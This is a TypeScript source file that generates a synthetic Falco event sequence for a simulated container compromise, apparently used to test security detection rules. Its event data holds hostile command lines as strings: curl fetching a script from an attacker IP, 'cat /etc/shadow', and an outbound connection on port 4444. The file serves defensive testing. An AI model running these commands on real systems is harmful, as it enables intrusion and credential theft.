// The scenario the whole project is built around: an attacker gets a shell in a
// container, downloads a tool, steals credentials and phones home.
import { accepted, falcoEvent, makeContainer, publicIp } from '../events.js';
import { FIELDS, RULES, TARGET_CONTAINER_RUNTIME } from '../rules.js';
import type { Scenario } from '../scenario.js';

export const shellAttack: Scenario = {
  name: 'shell-attack',
  description: 'Unexpected shell, suspicious tool, sensitive file read, outbound connection (4 events, ~11 s)',
  build(ctx) {
    const { rng } = ctx;
    const c = makeContainer(rng);
    const attackerIp = publicIp(rng);

    // One consistent process tree: runtime -> bash -> (curl, cat, curl).
    const runtimePid = rng.int(3000, 4900);
    const bashPid = rng.int(5000, 9000);
    const curl1Pid = bashPid + rng.int(5, 40);
    const catPid = curl1Pid + rng.int(1, 20);
    const curl2Pid = catPid + rng.int(1, 20);
    const clientPort = rng.int(32768, 60999);

    const events = [
      // T+0s: shell, whose parent is the container runtime
      falcoEvent(ctx, {
        rule: RULES.shell, container: c, offsetMs: 0,
        proc: { name: 'bash', cmdline: 'bash', pid: bashPid, ppid: runtimePid, pname: TARGET_CONTAINER_RUNTIME },
      }),
      // T+3s: curl, child of that bash
      falcoEvent(ctx, {
        rule: RULES.networkTool, container: c, offsetMs: 3000,
        proc: { name: 'curl', cmdline: `curl http://${attackerIp}:8080/tool.sh -o /tmp/tool.sh`, pid: curl1Pid, ppid: bashPid, pname: 'bash' },
      }),
      // T+7s: cat /etc/shadow, child of the same bash
      falcoEvent(ctx, {
        rule: RULES.sensitiveRead, container: c, offsetMs: 7000,
        proc: { name: 'cat', cmdline: 'cat /etc/shadow', pid: catPid, ppid: bashPid, pname: 'bash' },
        extraFields: { [FIELDS.fdName]: '/etc/shadow' },
      }),
      // T+11s: outbound connection to a public IP on port 4444
      falcoEvent(ctx, {
        rule: RULES.outbound, container: c, offsetMs: 11000,
        proc: { name: 'curl', cmdline: `curl ${attackerIp}:4444`, pid: curl2Pid, ppid: bashPid, pname: 'bash' },
        extraFields: {
          [FIELDS.fdName]: `${c.podIp}:${clientPort}->${attackerIp}:4444`,
          [FIELDS.clientIp]: c.podIp,
          [FIELDS.clientPort]: clientPort,
          [FIELDS.serverIp]: attackerIp,
          [FIELDS.serverPort]: 4444,
        },
      }),
    ];
    return events.map((e, i) => accepted([0, 3000, 7000, 11000][i]!, e));
  },
};
